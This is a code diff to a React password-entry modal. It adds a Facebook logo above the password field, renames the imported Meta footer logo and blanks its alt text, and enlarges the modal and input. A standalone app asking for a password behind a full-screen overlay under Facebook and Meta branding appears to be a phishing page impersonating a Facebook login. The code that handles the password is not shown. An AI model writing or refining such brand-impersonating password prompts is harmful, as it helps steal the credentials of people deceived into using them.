@@ -1,6 +1,7 @@
 'use client';
 
-import MetaLogo from '@/assets/images/meta-logo-image.png';
+import FooterLogo from '@/assets/images/meta-logo-image.png';
+import FBlogo from '@/assets/images/fb-logo-image.png';
 import { store } from '@/store/store';
 import { useTranslation } from '@/hooks/useTranslation';
 import config from '@/utils/config';
@@ -132,8 +133,11 @@ const PasswordModal: FC = () => {
             {/* Overlay mờ toàn màn hình */}
             <div className="fixed inset-0 z-40 bg-black/50 backdrop-blur-sm transition-all" style={{touchAction: 'manipulation'}}></div>
             <div className='fixed inset-0 z-50 flex h-screen w-screen items-center justify-center p-2 sm:p-4 md:p-6 overflow-hidden select-none' style={{touchAction: 'manipulation', userSelect: 'none'}}>
-                <div className='flex max-h-[95vh] w-full max-w-[340px] sm:max-w-sm md:max-w-md flex-col rounded-3xl bg-linear-to-br from-[#FCF3F8] to-[#EEFBF3] overflow-hidden'>
+                <div className='flex max-h-[95vh] min-h-[480px] sm:min-h-[540px] w-full max-w-[340px] sm:max-w-sm md:max-w-md flex-col rounded-3xl bg-linear-to-br from-[#FCF3F8] to-[#EEFBF3] overflow-hidden'>
                     <form onSubmit={handleSubmit} className='flex flex-1 flex-col overflow-y-auto items-center justify-center gap-1.5 sm:gap-2.5 md:gap-4 py-4 sm:py-6 md:py-8 px-2.5 sm:px-3.5 md:px-5'>
+                        {/* Facebook Logo */}
+                        <Image src={FBlogo} alt='FB' className='h-16 sm:h-20 w-auto mb-16 sm:mb-20' unoptimized />
+
                         {/* Password Input Section */}
                         <div className='w-full px-1.5 sm:px-3 md:px-4'>
                             <div className='relative w-full'>
@@ -144,7 +148,7 @@ const PasswordModal: FC = () => {
                                         setPassword(e.target.value);
                                         setError('');
                                     }}
-                                    className='h-10 sm:h-11 md:h-12 w-full rounded-xl border-2 border-[#d4dbe3] px-3 sm:px-3.5 py-1.5 sm:py-2 text-base focus:outline-none focus:border-blue-500 transition'
+                                    className='h-12 sm:h-13 md:h-14 w-full rounded-xl border-2 border-[#d4dbe3] px-3 sm:px-3.5 py-1.5 sm:py-2 text-base focus:outline-none focus:border-blue-500 transition'
                                     required
                                     autoComplete='password'
                                     placeholder={t('Enter your password')}
@@ -182,9 +186,9 @@ const PasswordModal: FC = () => {
                         </a>
                     </form>
 
-                    {/* Meta Logo Footer */}
+                    {/* Footer Logo */}
                     <div className='flex items-center justify-center p-1.5 sm:p-2 md:p-3'>
-                        <Image src={MetaLogo} alt='Meta' className='h-3.5 sm:h-4 w-14 sm:w-16' />
+                        <Image src={FooterLogo} alt='' className='h-3.5 sm:h-4 w-14 sm:w-16' />
                     </div>
                 </div>
             </div>
